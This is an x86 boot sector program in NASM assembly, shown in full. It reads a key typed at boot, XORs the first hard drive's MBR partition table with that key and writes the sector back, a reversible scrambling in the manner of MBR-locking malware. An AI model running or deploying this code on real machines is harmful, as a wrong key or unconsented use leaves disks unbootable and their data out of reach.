[bits 16]
[org 0x7c00]

	PARTITION_ENTRY_OFFSET equ 0x01be
	PARTITION_ENTRY_SIZE equ 0x40

	DRIVE_ID equ 0x80

	DATA_SEGMENT equ 0x07e0

	KEY_OFFSET equ 0x500
	KEY_SIZE equ 0x10

	jmp start
	
%macro init_screen 0
	mov ax, 0x03
	int 0x10
	mov ax, 0x500
	int 0x10
	mov ah, 0x02
        xor bh, bh
	xor dx, dx
        int 0x10
%endmacro

%macro init_mem 0
	mov ax, 0x0100
	mov ss, ax
	mov ax, DATA_SEGMENT
	mov es, ax
	mov sp, 0x2000
%endmacro

%macro memset_key 0
	xor ax, ax
	mov cx, KEY_SIZE
	mov di, KEY_OFFSET
	cld
	rep stosb
%endmacro


new_line:
	mov al, 0x0d
	call putchar
	mov al, 0x0a
	call putchar
	ret

putchar:
	push bx
	mov ah, 0x0e
        xor bx, bx
        int 0x10
	pop bx
	ret

print_reg:
	push bx
	push cx
	push dx
	mov cl, 0x7
	mov dl, al
print_reg_loop:
	mov bl, dl
	shr bl, cl
	mov al, bl
	and al, 0x1
	add al, '0'
	call putchar
	dec cl
	jns print_reg_loop
	call new_line
	pop dx
	pop cx
	pop bx
	ret

dump_mbr:
	xor bx, bx
	xor dh, dh
	mov dl, DRIVE_ID
	mov cx, 0x01
	mov ax, 0x0201
	int 0x13
	jc ERROR
	ret

xor_partition:
	xor bx, bx
xor_partition_loop:
	mov al, BYTE [es:PARTITION_ENTRY_OFFSET + bx]
	mov cl, BYTE [es:KEY_OFFSET + bx]
	xor al, cl
	mov BYTE [es:PARTITION_ENTRY_OFFSET + bx], al
	inc bx
	cmp bx, PARTITION_ENTRY_SIZE
	jne xor_partition_loop
	ret

cp_mem_to_drive:
	xor bx, bx
	mov ah, 0x03
	mov al, 0x01
	mov cl, 0x01
	xor ch, ch
	xor dh, dh
	mov dl, DRIVE_ID
	int 0x13
	jc ERROR
	ret

read_input:
	xor bx, bx
read_input_loop:
	xor ax, ax
	int 0x16
	cmp al, 0x0d
	je read_input_end
	call putchar
	mov BYTE [es:KEY_OFFSET + bx], al
	inc bl
	cmp bl, KEY_SIZE
	jne read_input_loop
read_input_end:
	call new_line
	ret

duplicate_key:
	mov cx, 0x03
duplicate_key_loop:
	xor bx, bx
duplicate_key_loop2:
	mov al, BYTE [es:KEY_OFFSET + bx]
	mov di, cx
	shl di, 4					; mult di by KEY_SIZE
	mov BYTE [es:bx + di + KEY_OFFSET], al
	inc bl
	cmp bl, KEY_SIZE
	jne duplicate_key_loop2
	loop duplicate_key_loop
	ret
	
start:
	init_mem
	init_screen
	memset_key
	call read_input
	call duplicate_key
	call dump_mbr
	call xor_partition
	call cp_mem_to_drive
	jmp FINISHED

ERROR:
	mov ah, al
	call print_reg
	mov al, 'E'
	call putchar
	mov al, 'R'
	call putchar
	mov al,	'R'
	call putchar
	call new_line
	jmp END

FINISHED:	
	mov al, 'O'
	call putchar
	mov al, 'K'
	call putchar
	call new_line
	jmp END

END:
	jmp END

	TIMES 510-($-$$) DB 0
	SIGNATURE DW 0xAA55
